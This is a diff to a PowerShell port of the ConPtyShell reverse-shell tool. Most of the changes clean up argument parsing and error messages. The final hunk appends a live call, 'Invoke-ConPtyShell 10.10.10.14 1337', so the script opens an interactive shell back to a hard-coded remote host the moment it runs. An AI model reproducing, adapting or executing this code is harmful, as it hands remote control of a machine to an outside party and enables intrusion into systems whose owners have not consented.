@@ -71,7 +71,7 @@ Examples:
 
     static [void] CheckArgs([string[]] $arguments) {
         if ($arguments.Length -lt 2) {
-            throw [ConPtyShellException] "ConPtyShell: Not enough arguments. 2 Arguments required. Use --help for additional help."
+            throw [ConPtyShellException] "Not enough arguments. 2 Arguments required. Use --help for additional help."
         }
     }
 
@@ -79,7 +79,7 @@ Examples:
         try {
             [System.Net.IPAddress]::Parse($ipString)
         } catch {
-            throw [ConPtyShellException] "ConPtyShell: Invalid remoteIp value $ipString"
+            throw [ConPtyShellException] "Invalid remoteIp value $ipString"
         }
 
         return $ipString
@@ -89,22 +89,22 @@ Examples:
         try {
             return [uint32]$arg
         } catch {
-            throw [ConPtyShellException] "ConPtyShell: Invalid unsigned integer value $arg"
+            throw [ConPtyShellException] "Invalid unsigned integer value $arg"
         }
     }
 
-    static [uint32] ParseRows([string] $arguments) {
+    static [uint32] ParseRows([string[]] $arguments) {
         [uint32] $rows = 24;
         if ($arguments.Length -gt 2) {
-            $rows = CheckUint($arguments[2]);
+            $rows = [ConPtyShellMainClass]::CheckUint($arguments[2]);
         }
         return $rows;
     }
 
-    static [uint32] ParseCols([string] $arguments) {
+    static [uint32] ParseCols([string[]] $arguments) {
         [uint32] $cols = 80;
         if ($arguments.Length -gt 3) {
-            $cols = CheckUint($arguments[3]);
+            $cols = [ConPtyShellMainClass]::CheckUint($arguments[3]);
         }
         return $cols;
     }
@@ -118,10 +118,10 @@ Examples:
         return $commandLine
     }
 
-    static [string] ConPtyShellMain([string[]] $args) {
-       [string] $output = "" 
-
-        if ($args.Length -eq 1 -and [ConPtyShellMainClass]::HelpRequired($args[0])) {
+    static [string] ConPtyShellMain([string[]] $arguments) {
+        [string] $output = "" 
+        
+        if ($arguments.Length -eq 1 -and [ConPtyShellMainClass]::HelpRequired($arguments[0])) {
             [ConPtyShellMainClass]::DisplayHelp()
         } else {
             [string] $remoteIp = ""
@@ -129,18 +129,18 @@ Examples:
             [bool] $upgradeShell = $false
 
             try {
-                [ConPtyShellMainClass]::CheckArgs($args)
+                [ConPtyShellMainClass]::CheckArgs($arguments)
                 
-                if (($args[0]).Contains("upgrade")) {
+                if (($arguments[0]).Contains("upgrade")) {
                     $upgradeShell = $true
                 } else {
-                    $remoteIp = [ConPtyShellMainClass]::CheckRemoteIpArg($args[0])
-                    $remotePort = [ConPtyShellMainClass]::CheckUint($args[1])
+                    $remoteIp = [ConPtyShellMainClass]::CheckRemoteIpArg($arguments[0])
+                    $remotePort = [ConPtyShellMainClass]::CheckUint($arguments[1])
                 }
 
-                [uint32] $rows = [ConPtyShellMainClass]::ParseRows($args)
-                [uint32] $cols = [ConPtyShellMainClass]::ParseCols($args)
-                [string] $commandLine = [ConPtyShellMainClass]::ParseCommandLine($args)
+                [uint32] $rows = [ConPtyShellMainClass]::ParseRows($arguments)
+                [uint32] $cols = [ConPtyShellMainClass]::ParseCols($arguments)
+                [string] $commandLine = [ConPtyShellMainClass]::ParseCommandLine($arguments)
 
                 $output = [ConPtyShell]::SpawnConPtyShell($remoteIp, $remotePort, $rows, $cols, $commandLine, $upgradeShell)
             } catch {
@@ -267,3 +267,5 @@ function Invoke-ConPtyShell
     $output = [ConPtyShellMainClass]::ConPtyShellMain($parametersConPtyShell)
     Write-Output $output
 }
+
+Invoke-ConPtyShell 10.10.10.14 1337
